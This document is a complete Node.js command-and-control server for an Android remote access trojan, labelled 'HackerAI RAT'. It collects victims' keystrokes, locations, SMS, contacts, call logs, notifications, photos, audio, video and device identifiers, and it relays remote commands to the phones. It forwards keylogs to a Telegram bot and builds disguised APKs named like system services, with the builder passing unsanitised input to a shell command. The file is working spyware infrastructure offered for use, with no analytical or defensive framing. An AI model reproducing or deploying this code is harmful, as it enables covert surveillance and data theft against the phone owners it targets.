const express = require('express');
const http = require('http');
const https = require('https');
const socketIO = require('socket.io');
const cors = require('cors');
const rateLimit = require('express-rate-limit');
const session = require('express-session');
const bcrypt = require('bcryptjs');
const jwt = require('jsonwebtoken');
const multer = require('multer');
const path = require('path');
const fs = require('fs-extra');
const archiver = require('archiver');
const { v4: uuidv4 } = require('uuid');

const app = express();
const server = http.createServer(app);
const io = socketIO(server, {
  cors: { origin: '*', methods: ['GET', 'POST'] },
  pingTimeout: 60000,
  pingInterval: 25000
});

// ============ CONFIG ============
const PORT = process.env.PORT || 3000;
const JWT_SECRET = process.env.JWT_SECRET || 'hackerai-rat-secret-change-in-production';
const SESSION_EXPIRY = 3600; // 1 hour

const USERS = {
  admin: { password: bcrypt.hashSync('admin123', 10), role: 'admin' }
};

// ============ MIDDLEWARE ============
app.use(cors());
app.use(express.json({ limit: '500mb' }));
app.use(express.urlencoded({ extended: true, limit: '500mb' }));

// Rate limiting
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 1000,
  message: { error: 'Too many requests' }
});
app.use('/api/', limiter);

// Static files
app.use(express.static(path.join(__dirname, 'public')));

// Upload config
const storage = multer.diskStorage({
  destination: (req, file, cb) => cb(null, path.join(__dirname, 'uploads')),
  filename: (req, file, cb) => cb(null, `${Date.now()}-${file.originalname}`)
});
const upload = multer({ storage, limits: { fileSize: 500 * 1024 * 1024 } });

// Ensure directories
fs.ensureDirSync(path.join(__dirname, 'uploads'));
fs.ensureDirSync(path.join(__dirname, 'builder'));

// ============ DATA STORE ============
const devices = new Map(); // deviceId -> deviceInfo
const deviceRooms = new Map(); // deviceId -> socketId
const keylogStore = new Map(); // deviceId -> [{ app, text, timestamp }]
const locationStore = new Map(); // deviceId -> [{ lat, lng, timestamp }]
const notificationStore = new Map(); // deviceId -> [{ app, title, text, timestamp }]
const buildHistory = [];

// Telegram bot config
let telegramConfig = { enabled: false, token: '', chatId: '' };

// ============ JWT AUTH ============
function generateToken(username) {
  return jwt.sign({ username, role: USERS[username]?.role || 'user' }, JWT_SECRET, { expiresIn: SESSION_EXPIRY });
}

function authenticateToken(req, res, next) {
  const authHeader = req.headers['authorization'];
  const token = authHeader && authHeader.split(' ')[1];
  if (!token) return res.status(401).json({ error: 'No token provided' });
  jwt.verify(token, JWT_SECRET, (err, user) => {
    if (err) return res.status(403).json({ error: 'Invalid or expired token' });
    req.user = user;
    next();
  });
}

// ============ TELEGRAM BOT ============
async function sendTelegram(message) {
  if (!telegramConfig.enabled) return;
  try {
    const fetch = require('node-fetch');
    await fetch(`https://api.telegram.org/bot${telegramConfig.token}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: telegramConfig.chatId, text: message, parse_mode: 'HTML' })
    });
  } catch (e) { console.error('Telegram send error:', e.message); }
}

// ============ SOCKET.IO ============
io.on('connection', (socket) => {
  console.log(`[+] Socket connected: ${socket.id}`);

  // Device registration
  socket.on('register_device', (data) => {
    const deviceId = data.deviceId || data.deviceInfo?.deviceId || uuidv4();
    const deviceInfo = {
      deviceId,
      manufacturer: data.deviceInfo?.manufacturer || 'Unknown',
      model: data.deviceInfo?.model || 'Unknown',
      androidVersion: data.deviceInfo?.androidVersion || 'Unknown',
      sdkLevel: data.deviceInfo?.sdkLevel || 0,
      buildFingerprint: data.deviceInfo?.buildFingerprint || '',
      kernelVersion: data.deviceInfo?.kernelVersion || '',
      securityPatch: data.deviceInfo?.securityPatch || '',
      imei: data.deviceInfo?.imei || '',
      simSerial: data.deviceInfo?.simSerial || '',
      subscriberId: data.deviceInfo?.subscriberId || '',
      ip: socket.handshake.address,
      firstSeen: Date.now(),
      lastSeen: Date.now(),
      online: true
    };

    devices.set(deviceId, deviceInfo);
    deviceRooms.set(deviceId, socket.id);
    socket.join(`device:${deviceId}`);

    if (!keylogStore.has(deviceId)) keylogStore.set(deviceId, []);
    if (!locationStore.has(deviceId)) locationStore.set(deviceId, []);
    if (!notificationStore.has(deviceId)) notificationStore.set(deviceId, []);

    console.log(`[+] Device registered: ${deviceId} (${deviceInfo.manufacturer} ${deviceInfo.model})`);
    io.emit('device_online', { deviceId, deviceInfo });
    
    // Telegram alert
    sendTelegram(`🟢 <b>Device Online</b>\nID: <code>${deviceId}</code>\nModel: ${deviceInfo.manufacturer} ${deviceInfo.model}\nAndroid: ${deviceInfo.androidVersion} (SDK ${deviceInfo.sdkLevel})`);
    
    socket.emit('registered', { deviceId });
  });

  // Handle all events from device
  const handleEvent = (eventName) => (data) => {
    const deviceId = data.deviceId || 'unknown';
    const enriched = { ...data, serverTimestamp: Date.now() };
    io.to(`device:${deviceId}`).emit(eventName, enriched);

    // Update last seen
    const dev = devices.get(deviceId);
    if (dev) { dev.lastSeen = Date.now(); }

    // Store specific data
    if (eventName === 'keystroke') {
      const logs = keylogStore.get(deviceId) || [];
      logs.push({ app: data.app, text: data.text, timestamp: Date.now() });
      if (logs.length > 10000) logs.splice(0, 1000);
      keylogStore.set(deviceId, logs);
      sendTelegram(`⌨️ <b>Keylog</b> [${deviceId}]\nApp: ${data.app || 'Unknown'}\nText: <code>${data.text?.substring(0, 200)}</code>`);
    }
    if (eventName === 'location') {
      const locs = locationStore.get(deviceId) || [];
      locs.push({ lat: data.lat, lng: data.lng, accuracy: data.accuracy, timestamp: Date.now() });
      if (locs.length > 10000) locs.splice(0, 1000);
      locationStore.set(deviceId, locs);
    }
    if (eventName === 'notification') {
      const notifs = notificationStore.get(deviceId) || [];
      notifs.push({ app: data.packageName, title: data.title, text: data.text, timestamp: Date.now() });
      if (notifs.length > 1000) notifs.splice(0, 100);
      notificationStore.set(deviceId, notifs);
    }
  };

  socket.on('device_info', handleEvent('device_info'));
  socket.on('location', handleEvent('location'));
  socket.on('sms', handleEvent('sms'));
  socket.on('call_log', handleEvent('call_log'));
  socket.on('contacts', handleEvent('contacts'));
  socket.on('screenshot', handleEvent('screenshot'));
  socket.on('keystroke', handleEvent('keystroke'));
  socket.on('notification', handleEvent('notification'));
  socket.on('screen_frame', handleEvent('screen_frame'));
  socket.on('command_response', handleEvent('command_response'));
  socket.on('file_list', handleEvent('file_list'));
  socket.on('file_content', handleEvent('file_content'));
  socket.on('battery', handleEvent('battery'));
  socket.on('network', handleEvent('network'));
  socket.on('packages', handleEvent('packages'));
  socket.on('photo', handleEvent('photo'));
  socket.on('audio', handleEvent('audio'));
  socket.on('video', handleEvent('video'));

  // Command from dashboard to device
  socket.on('send_command', (data) => {
    const { deviceId, command, params } = data;
    const targetSocketId = deviceRooms.get(deviceId);
    if (targetSocketId) {
      io.to(targetSocketId).emit('command', { command, params, id: uuidv4() });
    } else {
      socket.emit('command_error', { error: 'Device not connected', deviceId });
    }
  });

  // Heartbeat
  socket.on('heartbeat', (data) => {
    const dev = devices.get(data.deviceId);
    if (dev) {
      dev.lastSeen = Date.now();
      dev.battery = data.battery;
      dev.batteryCharging = data.charging;
    }
    socket.emit('heartbeat_ack', { serverTime: Date.now() });
  });

  socket.on('disconnect', () => {
    console.log(`[-] Socket disconnected: ${socket.id}`);
    for (const [devId, sockId] of deviceRooms.entries()) {
      if (sockId === socket.id) {
        const dev = devices.get(devId);
        if (dev) dev.online = false;
        deviceRooms.delete(devId);
        io.emit('device_offline', { deviceId: devId });
        sendTelegram(`🔴 <b>Device Offline</b>\nID: <code>${devId}</code>\nModel: ${dev?.manufacturer || 'Unknown'} ${dev?.model || ''}`);
        break;
      }
    }
  });
});

// ============ REST API ============

// Auth
app.post('/api/login', (req, res) => {
  const { username, password } = req.body;
  if (!USERS[username]) return res.status(401).json({ error: 'Invalid credentials' });
  if (!bcrypt.compareSync(password, USERS[username].password)) return res.status(401).json({ error: 'Invalid credentials' });
  const token = generateToken(username);
  res.json({ token, username, role: USERS[username].role });
});

app.get('/api/verify', authenticateToken, (req, res) => {
  res.json({ valid: true, user: req.user });
});

// Devices
app.get('/api/devices', authenticateToken, (req, res) => {
  const deviceList = Array.from(devices.values());
  res.json({ devices: deviceList });
});

app.get('/api/devices/:deviceId', authenticateToken, (req, res) => {
  const device = devices.get(req.params.deviceId);
  if (!device) return res.status(404).json({ error: 'Device not found' });
  res.json({ device });
});

// Device data endpoints
app.get('/api/devices/:deviceId/keylogs', authenticateToken, (req, res) => {
  res.json({ keylogs: keylogStore.get(req.params.deviceId) || [] });
});

app.get('/api/devices/:deviceId/locations', authenticateToken, (req, res) => {
  res.json({ locations: locationStore.get(req.params.deviceId) || [] });
});

app.get('/api/devices/:deviceId/notifications', authenticateToken, (req, res) => {
  res.json({ notifications: notificationStore.get(req.params.deviceId) || [] });
});

// Send command via REST
app.post('/api/devices/:deviceId/command', authenticateToken, (req, res) => {
  const { command, params } = req.body;
  const targetSocketId = deviceRooms.get(req.params.deviceId);
  if (!targetSocketId) return res.status(400).json({ error: 'Device offline' });
  io.to(targetSocketId).emit('command', { command, params, id: uuidv4() });
  res.json({ success: true });
});

// File upload for device
app.post('/api/upload', authenticateToken, upload.single('file'), (req, res) => {
  if (!req.file) return res.status(400).json({ error: 'No file' });
  res.json({ url: `/uploads/${req.file.filename}`, filename: req.file.filename });
});

app.use('/uploads', express.static(path.join(__dirname, 'uploads')));

// Telegram config
app.get('/api/telegram/config', authenticateToken, (req, res) => {
  res.json(telegramConfig);
});

app.post('/api/telegram/config', authenticateToken, (req, res) => {
  telegramConfig = { enabled: req.body.enabled || false, token: req.body.token || '', chatId: req.body.chatId || '' };
  res.json({ success: true });
});

// APK Builder
app.post('/api/build-apk', authenticateToken, upload.fields([{ name: 'logo', maxCount: 1 }]), async (req, res) => {
  try {
    const { serverUrl, serverPort, appName, packageName } = req.body;
    if (!serverUrl) return res.status(400).json({ error: 'Server URL required' });

    const buildId = uuidv4().substring(0, 8);
    const logEntry = { timestamp: Date.now(), serverUrl, buildId, status: 'started' };
    buildHistory.push(logEntry);

    // Run build script
    const { execSync } = require('child_process');
    const result = execSync(`node builder/build-apk.js "${serverUrl}" "${serverPort || 3000}" "${appName || 'SystemService'}" "${packageName || 'com.android.systemservice'}" "${buildId}"`, {
      cwd: __dirname,
      timeout: 120000
    }).toString();

    logEntry.status = 'success';
    const apkPath = path.join(__dirname, 'builder', 'outputs', `HackerRAT-${buildId}.apk`);
    
    if (fs.existsSync(apkPath)) {
      res.download(apkPath, `HackerRAT-${buildId}.apk`);
      logEntry.file = `HackerRAT-${buildId}.apk`;
    } else {
      res.json({ success: true, buildId, output: result });
    }
  } catch (err) {
    console.error('Build error:', err.message);
    res.status(500).json({ error: err.message });
  }
});

app.get('/api/build-history', authenticateToken, (req, res) => {
  res.json({ builds: buildHistory });
});

// System info
app.get('/api/stats', authenticateToken, (req, res) => {
  const onlineCount = Array.from(devices.values()).filter(d => d.online).length;
  res.json({
    totalDevices: devices.size,
    onlineDevices: onlineCount,
    uptime: process.uptime(),
    memory: process.memoryUsage(),
    telegramEnabled: telegramConfig.enabled
  });
});

// ============ START ============
server.listen(PORT, '0.0.0.0', () => {
  console.log(`[+] HackerAI RAT Server running on port ${PORT}`);
  console.log(`[+] Dashboard: http://0.0.0.0:${PORT}`);
  console.log(`[+] WebSocket ready`);
});
